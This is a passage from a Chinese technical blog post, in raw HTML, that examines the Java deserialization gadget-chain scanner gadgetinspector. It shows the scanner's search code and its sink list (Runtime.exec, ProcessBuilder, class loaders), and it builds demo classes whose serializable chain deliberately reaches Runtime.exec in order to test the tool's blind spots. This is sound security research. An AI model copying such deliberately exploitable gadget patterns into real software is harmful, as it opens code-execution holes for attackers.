class="comment">//新节点加入已访问集合</span></span><br><span class="line">                            exploredMethods.add(newLink);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//保存搜索到的利用链到gadget-chains.txt</span></span><br><span class="line">        <span class="keyword">try</span> (OutputStream outputStream = Files.newOutputStream(Paths.get(<span class="string">"gadget-chains.txt"</span>));</span><br><span class="line">             Writer writer = <span class="keyword">new</span> OutputStreamWriter(outputStream, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">            <span class="keyword">for</span> (GadgetChain chain : discoveredGadgets) &#123;</span><br><span class="line">                printGadgetChain(writer, chain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOGGER.info(<span class="string">"Found &#123;&#125; gadget chains."</span>, discoveredGadgets.size());</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>作者给出的sink方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isSink</span><span class="params">(MethodReference.Handle method, <span class="keyword">int</span> argIndex, InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/io/FileInputStream"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/io/FileOutputStream"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/nio/file/Files"</span>)</span><br><span class="line">                &amp;&amp; (method.getName().equals(<span class="string">"newInputStream"</span>)</span><br><span class="line">                || method.getName().equals(<span class="string">"newOutputStream"</span>)</span><br><span class="line">                || method.getName().equals(<span class="string">"newBufferedReader"</span>)</span><br><span class="line">                || method.getName().equals(<span class="string">"newBufferedWriter"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/Runtime"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exec"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        if (method.getClassReference().getName().equals("java/lang/Class")</span></span><br><span class="line"><span class="comment">                &amp;&amp; method.getName().equals("forName")) &#123;</span></span><br><span class="line"><span class="comment">            return true;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if (method.getClassReference().getName().equals("java/lang/Class")</span></span><br><span class="line"><span class="comment">                &amp;&amp; method.getName().equals("getMethod")) &#123;</span></span><br><span class="line"><span class="comment">            return true;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">// If we can invoke an arbitrary method, that's probably interesting (though this doesn't assert that we</span></span><br><span class="line">        <span class="comment">// can control its arguments). Conversely, if we can control the arguments to an invocation but not what</span></span><br><span class="line">        <span class="comment">// method is being invoked, we don't mark that as interesting.</span></span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/reflect/Method"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"invoke"</span>) &amp;&amp; argIndex == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/net/URLClassLoader"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"newInstance"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/System"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exit"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/Shutdown"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exit"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/Runtime"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exit"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/nio/file/Files"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"newOutputStream"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/ProcessBuilder"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>) &amp;&amp; argIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">"java/lang/ClassLoader"</span>))</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/net/URL"</span>) &amp;&amp; method.getName().equals(<span class="string">"openStream"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Some groovy-specific sinks</span></span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"org/codehaus/groovy/runtime/InvokerHelper"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"invokeMethod"</span>) &amp;&amp; argIndex == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">"groovy/lang/MetaClass"</span>))</span><br><span class="line">                &amp;&amp; Arrays.asList(<span class="string">"invokeMethod"</span>, <span class="string">"invokeConstructor"</span>, <span class="string">"invokeStaticMethod"</span>).contains(method.getName())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对于每个入口节点来说，其全部子方法调用、孙子方法调用等等递归下去，就构成了一棵树。之前的步骤所做的，就相当于生成了这颗树，而这一步所做的，就是从根节点出发，找到一条通往叶子节点的道路，使得这个叶子节点正好是我们所期望的sink方法。gadgetinspector对树的遍历采用的是广度优先(BFS)，而且对于已经检查过的节点会直接跳过，这样减少了运行开销，避免了环路，但是丢掉了很多其他链。</p><p>这个过程看起来就像下面这样：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/24.png" alt=""></p><p>通过污点的传递，最终找到从source-&gt;sink的利用链</p><p><strong>注</strong>：targ表示污染参数的index，0-&gt;1这样的表示父方法的0参传递给了子方法的1参</p><h3 id="样例分析"><a href="#样例分析" class="headerlink" title="样例分析"></a>样例分析</h3><p>现在根据作者的样例写个具体的demo实例来测试下上面这些步骤。</p><p>demo如下:</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/25.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">IFn.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IFn</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">FnEval.java</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnEval</span> <span class="keyword">implements</span> <span class="title">IFn</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">FnEval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Runtime.getRuntime().exec((String) arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">FnConstant.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnConstant</span> <span class="keyword">implements</span> <span class="title">IFn</span> , <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Object value;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">FnConstant</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.value = value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">FnCompose.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnCompose</span> <span class="keyword">implements</span> <span class="title">IFn</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> IFn f1, f2;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">FnCompose</span><span class="params">(IFn f1, IFn f2)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.f1 = f1;</span><br><span class="line">            <span class="keyword">this</span>.f2 = f2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> f2.invokeCall(f1.invokeCall(arg));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">TestDemo.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDemo</span> </span>&#123;</span><br><span class="line">        <span class="comment">//测试拓扑排序的正确性</span></span><br><span class="line">        <span class="keyword">private</span> String test;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">pMethod</span><span class="params">(String arg)</span></span>&#123;</span><br><span class="line">            String vul = cMethod(arg);</span><br><span class="line">            <span class="keyword">return</span> vul;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">cMethod</span><span class="params">(String arg)</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> arg.toUpperCase();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">AbstractTableModel.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.model;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> com.demo.ifn.IFn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line">    <span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractTableModel</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> HashMap&lt;String, IFn&gt; __clojureFnMap;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">AbstractTableModel</span><span class="params">(HashMap&lt;String, IFn&gt; clojureFnMap)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.__clojureFnMap = clojureFnMap;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            IFn f = __clojureFnMap.get(<span class="string">"hashCode"</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                f.invokeCall(<span class="keyword">this</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.__clojureFnMap.hashCode() + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>注</strong>：下面截图中数据的顺序做了调换，同时数据也只给出com/demo中的数据</p><h4 id="Step1-枚举全部类及每个类所有方法"><a href="#Step1-枚举全部类及每个类所有方法" class="headerlink" title="Step1 枚举全部类及每个类所有方法"></a>Step1 枚举全部类及每个类所有方法</h4><p>classes.dat:</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/26.png" alt=""></p><p>methods.dat:</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/27.png" alt=""></p><h4 id="Step2-生成passthrough数据流-1"><a href="#Step2-生成passthrough数据流-1" class="headerlink" title="Step2 生成passthrough数据流"></a>Step2 生成passthrough数据流</h4><p>passthrough.dat:</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/28.png" alt=""></p><p>可以看到IFn的子类中只有FnConstant的invokeCall在passthrough数据流中，因为其他几个在静态分析中无法判断返回值与参数的关系。同时TestDemo的cMethod与pMethod都在passthrough数据流中，这也说明了拓扑排序那一步的必要性和正确性。</p><h4 id="Step3-枚举passthrough调用图-1"><a href="#Step3-枚举passthrough调用图-1" class="headerlink" title="Step3 枚举passthrough调用图"></a>Step3 枚举passthrough调用图</h4><p>callgraph.dat:</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/29.png" alt=""></p><h4 id="Step4-搜索可用的source-1"><a href="#Step4-搜索可用的source-1" class="headerlink" title="Step4 搜索可用的source"></a>Step4 搜索可用的source</h4><p>sources.dat:</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/30.png" alt=""></p><h4 id="Step5-搜索生成调用链-1"><a href="#Step5-搜索生成调用链-1" class="headerlink" title="Step5 搜索生成调用链"></a>Step5 搜索生成调用链</h4><p>在gadget-chains.txt中找到了如下链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com/demo/model/AbstractTableModel.hashCode()I (0)</span><br><span class="line">  com/demo/ifn/FnEval.invokeCall(Ljava/lang/Object;)Ljava/lang/Object; (1)</span><br><span class="line">  java/lang/Runtime.exec(Ljava/lang/String;)Ljava/lang/Process; (1)</span><br></pre></td></tr></table></figure><p>可以看到选择的确实是找了一条最短的路径，并没有经过FnCompose、FnConstant路径。</p><h5 id="环路造成路径爆炸"><a href="#环路造成路径爆炸" class="headerlink" title="环路造成路径爆炸"></a>环路造成路径爆炸</h5><p>上面流程分析第五步中说到，如果去掉已访问过节点的判断会怎么样呢，能不能生成经过FnCompose、FnConstant的调用链呢？</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/31.png" alt=""></p><p>陷入了爆炸状态，Search space无限增加，其中必定存在环路。作者使用的策略是访问过的节点就不再访问了，这样解决的环路问题，但是丢失了其他链。</p><p>比如上面的FnCompose类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fncompose</span> <span class="keyword">implements</span> <span class="title">IFn</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> IFn f1,f2;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object arg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> f2.invoke(f1.invoke(arg));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于IFn是接口，所以在调用链生成中会查找是它的子类，假如f1,f2都是FnCompose类的对象，这样形成了环路。</p><h5 id="隐式调用"><a href="#隐式调用" class="headerlink" title="隐式调用"></a>隐式调用</h5><p>测试隐式调用看工具能否发现，将FnEval.java做一些修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FnEval.java</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnEval</span> <span class="keyword">implements</span> <span class="title">IFn</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String cmd;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">FnEval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="keyword">this</span>.cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"FnEval&#123;&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.cmd = (String) arg;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span> + <span class="string">" test"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">com/demo/model/AbstractTableModel.hashCode()I (0)</span><br><span class="line">  com/demo/ifn/FnEval.invokeCall(Ljava/lang/Object;)Ljava/lang/Object; (0)</span><br><span class="line">  java/lang/StringBuilder.append(Ljava/lang/Object;)Ljava/lang/StringBuilder; (1)</span><br><span class="line">  java/lang/String.valueOf(Ljava/lang/Object;)Ljava/lang/String; (0)</span><br><span class="line">  com/demo/ifn/FnEval.toString()Ljava/lang/String; (0)</span><br><span class="line">  java/lang/Runtime.exec(Ljava/lang/String;)Ljava/lang/Process; (1)</span><br></pre></td></tr></table></figure><p>隐式调用了tostring方法，说明在字节码分析中做了查找隐式调用这一步。</p><h5 id="不遵循反射调用"><a href="#不遵循反射调用" class="headerlink" title="不遵循反射调用"></a>不遵循反射调用</h5><p>在github的工具说明中，作者也说到了在静态分析中这个工具的盲点，像下面这中<code>FnEval.class.getMethod(&quot;exec&quot;, String.class).invoke(null, arg)</code>写法是不遵循反射调用的，将FnEval.java修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">FnEval.java</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnEval</span> <span class="keyword">implements</span> <span class="title">IFn</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FnEval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">(String arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(arg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> FnEval.class.getMethod(<span class="string">"exec"</span>, String.class).invoke(<span class="keyword">null</span>, arg);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过测试，确实没有发现。但是将<code>FnEval.class.getMethod(&quot;exec&quot;, String.class).invoke(null, arg)</code>改为<code>this.getClass().getMethod(&quot;exec&quot;, String.class).invoke(null, arg)</code>这种写法却是可以发现的。</p><h5 id="特殊语法"><a href="#特殊语法" class="headerlink" title="特殊语法"></a>特殊语法</h5><p>测试一下比较特殊的语法呢，比如lambda语法？将FnEval.java做一些修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 